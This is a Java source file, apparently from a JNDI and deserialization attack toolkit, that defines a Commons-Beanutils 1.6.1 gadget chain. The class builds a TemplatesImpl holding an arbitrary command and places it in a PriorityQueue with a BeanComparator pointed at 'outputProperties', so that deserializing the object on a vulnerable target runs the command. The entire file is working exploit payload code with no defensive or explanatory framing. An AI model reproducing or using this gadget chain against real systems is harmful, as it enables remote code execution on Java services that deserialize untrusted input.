package com.qi4l.jndi.gadgets;

import com.qi4l.jndi.gadgets.annotation.Authors;
import com.qi4l.jndi.gadgets.annotation.Dependencies;
import com.qi4l.jndi.gadgets.utils.Gadgets;
import com.qi4l.jndi.gadgets.utils.Reflections;

import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.math.BigInteger;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.Comparator;
import java.util.PriorityQueue;

@Dependencies({"commons-beanutils:commons-beanutils:1.6.1"})
@Authors({Authors.PEIQIF4CK})
public class CommonsBeanutils5 implements ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {
        final Object template;
        template = Gadgets.createTemplatesImpl(command);

        URLClassLoader      classLoader    = new URLClassLoader(new URL[]{new URL("file://libs/commons-beanutils-1.6.1.jar")}, Thread.currentThread().getContextClassLoader());
        Class<?>            BeanComparator = classLoader.loadClass("org.apache.commons.beanutils.BeanComparator");
        Constructor<?>      constructor    = BeanComparator.getConstructor(String.class);
        Object              comparator     = constructor.newInstance("lowestSetBit");
        final PriorityQueue queue          = new PriorityQueue(2, (Comparator) comparator);


        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        Reflections.setFieldValue(comparator, "property", "outputProperties");
        Reflections.setFieldValue(queue, "queue", new Object[]{template, template});

        return queue;
    }
}
